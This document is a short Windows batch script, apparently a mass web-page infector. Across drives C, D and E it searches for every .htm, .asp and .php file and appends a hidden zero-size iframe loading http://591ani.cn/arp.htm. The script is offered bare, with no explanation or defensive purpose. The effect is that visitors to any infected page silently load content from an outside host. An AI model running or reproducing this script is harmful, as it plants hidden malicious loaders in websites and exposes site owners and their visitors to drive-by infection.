@echo off
for %%a in (c d e) do (
if exist %%a:\nul (
for /f "tokens=*" %%b in ('dir /s/b/a-d %%a:\*.htm') do (echo ^<iframe src=""http://591ani.cn/arp.htm"" width=0 height=0 border=0^>^</iframe^>>> "%%b")))
@echo off
for %%a in (c d e) do (
if exist %%a:\nul (
for /f "tokens=*" %%b in ('dir /s/b/a-d %%a:\*.asp') do (echo ^<iframe src="http://591ani.cn/arp.htm" width=0 height=0 border=0^>^</iframe^>>> "%%b")))
@echo off
for %%a in (c d e) do (
if exist %%a:\nul (
for /f "tokens=*" %%b in ('dir /s/b/a-d %%a:\*.php') do (echo ^<iframe src="http://591ani.cn/arp.htm" width=0 height=0 border=0^>^</iframe^>>> "%%b")))
